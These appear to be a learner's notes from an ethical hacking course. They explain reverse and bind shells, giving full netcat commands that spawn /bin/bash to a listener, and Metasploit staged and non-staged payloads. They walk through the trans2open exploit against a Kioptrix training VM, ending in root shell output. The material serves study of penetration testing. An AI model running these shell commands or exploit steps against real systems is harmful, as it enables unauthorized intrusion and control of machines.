# Exploitation Basics

## Reverse Shells vs Bind Shells

### netcat

- reverse shell: a victim connects to us, we executes a linux bin shell when it connects, we're listening. 95% of cases.
- bind shell: we connect to a port on the target, the victim is listening. Uesful to bypass firewalls.

Reverse shell:

1. open a port: `nc -nvlp 4444`
2. `nc 192.168.92.128 4444 -e /bin/bash`

Bind shell:

1. `nc -nvlp 4444 -e /bin/bash`
2. connect to our victim: `nc 192.168.92.128 4444`

Note: `4444` is often blacklisted by antiviruses and firewalls.

## Staged vs Non-Staged Payloads

- non-staged payload: sends exploit shellcode all at once (large size, won't always work) (windows/meterpreter_reverse_tcp)
- staged payload: sends in stages (can be less stable), metasploit identifies them with an extra / (windows/meterpreter/reverse_tcp)

if one type is not working, try the other one.

## Gaining Root with Metasploit

1. run `msfconsole`
2. `search trans2open`, look for the targeted OS
3. `use 1`, then `options` to know which options to provide
4. `set rhosts 192.168.92.129`, then `options` again to check if it's set and `show targets`
5. type `run` or `exploit`, the payload is the issue, `options` again.
6. `set payload linux/x86/shell_reverse_tcp` with autocompletion to know our options, now it's a non-staged payload. `options` again to check if it's set.

we're in:

```
whoami
root
hostname
kioptrix.level1
```

## Manual Exploitation

## Brute Force Attacks

## Credential Stuffing and Password Spraying

## Our Notes, Revisited
